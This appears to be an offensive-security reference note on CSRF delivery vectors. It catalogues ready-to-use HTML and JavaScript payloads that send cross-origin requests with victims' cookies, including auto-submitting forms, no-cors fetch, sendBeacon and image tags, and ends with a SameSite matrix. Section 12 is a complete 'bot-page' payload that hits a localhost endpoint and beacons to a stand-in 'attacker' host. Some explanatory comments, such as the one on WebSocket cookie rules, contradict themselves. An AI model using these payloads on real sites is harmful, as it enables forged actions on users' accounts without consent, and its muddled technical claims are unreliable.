# Delivery vectors — every way a page fires a cross-origin request

The CSRF delivery vehicle is anything a browser will send cross-
origin with ambient credentials. Ordered by reach and what content
each can carry.

---

## 1. The `<form>` — the workhorse

```html
<!-- auto-submitting POST form — the canonical CSRF -->
<form id="f" action="https://target/change" method="POST">
  <input name="a" value="1">
</form>
<script>document.getElementById('f').submit()</script>

<!-- text/plain variant — the JSON-assembly shape -->
<form id="f" action="https://target/update" method="POST" enctype="text/plain">
  <input name='{"a":"' value='x","i":"'}'>
</form>
<script>f.submit()</script>

<!-- multipart variant — a file or field carrying raw text -->
<form id="f" action="https://target/update" method="POST" enctype="multipart/form-data">
  <input name="config" value='{"a":1}'>
</form>
<script>f.submit()</script>

<!-- GET form — the SameSite=Lax open case -->
<form id="f" action="https://target/transfer" method="GET">
  <input name="to" value="me"><input name="amount" value="1">
</form>
<script>f.submit()</script>
```

The form is a NAVIGATION — top-level by default; it doesn't read
the response (unless targeting an iframe). The response goes to the
frame/target — the write's EFFECT is the readback, not the response.

## 2. `fetch` with `mode: 'no-cors'` — the fire-and-forget

```js
fetch('https://target/change', {
  method: 'POST',
  mode: 'no-cors',
  credentials: 'include',               // cookies attach? no —
                                        // no-cors omits credentials
                                        // unless 'include' —
                                        // 'include' IS allowed in
                                        // no-cors and sends cookies!
  headers: {'Content-Type':'text/plain'},
  body: '{"a":1,"i":"='+'"}'
})
```

`no-cors` mode + `credentials:'include'` — the request goes cross-
origin WITH cookies, no preflight, but the response is opaque
(unreadable). The content-type is restricted to CORS-safelisted
headers — `application/json` is NOT allowed; `text/plain`/
`application/x-www-form-urlencoded`/`multipart/form-data` are.

## 3. `<img>`/`<script>`/`<link>`/`<iframe>` src — the GET carriers

```html
<img src="https://target/transfer?to=me&amount=1">
<script src="https://target/transfer?to=me"></script>
<link rel="stylesheet" href="https://target/transfer?to=me">
<iframe src="https://target/transfer?to=me"></iframe>
<video src="https://target/x"></video>
<audio src="https://target/x"></audio>
<embed src="https://target/x">
<object data="https://target/x"></object>
<input type="image" src="https://target/x">
<body background="https://target/x">
<table background="https://target/x">
<svg><image href="https://target/x"></svg>
<video><track src="https://target/x"></video>
<iframe srcdoc="<img src='https://target/x'>"></iframe>
```

GET-only, sub-resource requests — NOT top-level navigations — so
SameSite=Lax blocks the cookie on these. Only SameSite=None or
missing-on-old-bot cookies attach. For a GET-write under Lax, the
carrier must be a TOP-LEVEL nav (form GET, link click, meta refresh,
`location=`/`window.open`).

## 4. `navigator.sendBeacon` — the background POST

```js
navigator.sendBeacon('https://target/change',
  new Blob(['{"a":1,"i":"="}'], {type:'text/plain'}))
navigator.sendBeacon('https://target/change', 'a=1')
navigator.sendBeacon('https://target/change', new URLSearchParams('a=1'))
```

Beacon sends a POST cross-origin with credentials (same rules as
fetch `include`), content-type = the Blob type — `text/plain` works.
No response read. Fires on page-unload too — good for a bot-page
that navigates away.

## 5. `XMLHttpRequest` — the legacy fetch

```js
var x = new XMLHttpRequest();
x.open('POST','https://target/change',true);
x.withCredentials = true;              // cookies attach
x.setRequestHeader('Content-Type','text/plain');
x.send('{"a":1,"i":"="}');
```

Same CORS-safelisted-header rules as fetch — `text/plain` ok,
`application/json` triggers preflight (which fails without CORS-
open on the target).

## 6. WebSocket — the non-HTTP carrier

```js
var ws = new WebSocket('wss://target/ws');
ws.onopen = () => ws.send(JSON.stringify({op:'update',data:{a:1}}));
```

WebSocket handshake is an HTTP Upgrade — cookies attach per the
cookie rules — NO SameSite gate on ws/wss! The browser sends
cookies on the ws handshake regardless of SameSite in many engines
(the handshake is same-origin-ish historically — actually ws does
send cookies cross-origin; SameSite does NOT apply to ws in the
legacy engines — modern Chrome applies Lax-ish rules to ws too, but
the behavior varies). `web-websocket` covers the ws-hijack class.

## 7. `EventSource` — the GET-stream

```js
new EventSource('https://target/stream?to=me&amount=1');
// GET with credentials — same cookie rules; sub-resource, Lax-blocked
```

## 8. `<a>` click / `location=` / `window.open` / meta-refresh — the top-level navs

```html
<a href="https://target/transfer?to=me&amount=1">click</a>
<script>location='https://target/transfer?to=me&amount=1'</script>
<script>window.open('https://target/transfer?to=me&amount=1')</script>
<meta http-equiv="refresh" content="0;url=https://target/transfer?to=me&amount=1">
```

The ONLY carriers that attach a `SameSite=Lax` cookie — a top-level
GET navigation is the Lax-exception. All GET-only.

## 9. `history.pushState`/`replaceState` + form — the URL-shaping

```js
history.replaceState(null,'','/x');   // changes the page's own URL —
                                      // not a request
// combined with a form whose action is relative — the base changes
```

Same-origin only — not a CSRF carrier; a same-origin URL trick.

## 10. `window.name`/`postMessage` — the non-request carriers

```js
window.postMessage({a:1}, 'https://target')   // a message, not a request —
                                            // no cookie attaches; the
                                            // RECEIVING page must act on it
window.name = JSON.stringify({a:1})           // a channel, not a request
```

Not CSRF carriers — no credential attaches. They're for a page that
TRUSTS postMessage and acts on it — a different class (postMessage
hijack).

## 11. `data:`/`javascript:`/`about:` origins — the referer-strippers

```html
<script>location='data:text/html,<form action="https://target/x" method=POST>'+
'<input name=a value=1></form><script>document.forms[0].submit()<\/script>'
</script>
<!-- the POST comes from an opaque origin — Origin: null, no Referer —
     the absent-origin bypass in origin-referer.md -->
```

## 12. The bot-page composite — what the delivered page does

```html
<!doctype html><html><body>
<form id="f" action="http://127.0.0.1:1337/update_tornado" method="POST" enctype="text/plain">
  <input name='{"machine_id":"host-1051","ignore":"' value='"}'>
</form>
<script>
  document.getElementById('f').submit();          // the write
  // optionally a beacon home for the confirmation
  fetch('https://attacker/hit?d=1',{mode:'no-cors'});
</script>
</body></html>
```

The TornadoService shape: the bot loads this page; the form POSTs
to a localhost endpoint the bot's socket-peer is `127.0.0.1` for —
a `remote_ip == 127.0.0.1` gate passes for the bot, fails for you.

## 13. The carrier→SameSite→content-type matrix

| Carrier | Method | Content-type | Cookie under Lax |
|---|---|---|---|
| form GET | GET | query-string | YES (top-nav) |
| form POST urlencoded | POST | urlencoded | no |
| form POST text/plain | POST | text/plain | no |
| form POST multipart | POST | multipart | no |
| form any → None+Secure | any | any of the 3 | YES |
| fetch no-cors + include | POST/GET | text/plain/urlencoded | no |
| xhr + withCredentials | POST/GET | text/plain/urlencoded | no |
| sendBeacon | POST | blob-type | no |
| img/script/link src | GET | query-string | no (sub-resource) |
| a/meta/location/window.open | GET | query-string | YES (top-nav) |
| iframe src | GET | query-string | no |
| EventSource | GET | query-string | no |
| WebSocket | ws | message | engine-dependent |

Under `SameSite=None; Secure` EVERY carrier attaches. Under `Lax`
only the top-nav GET rows. Under `Strict` none.
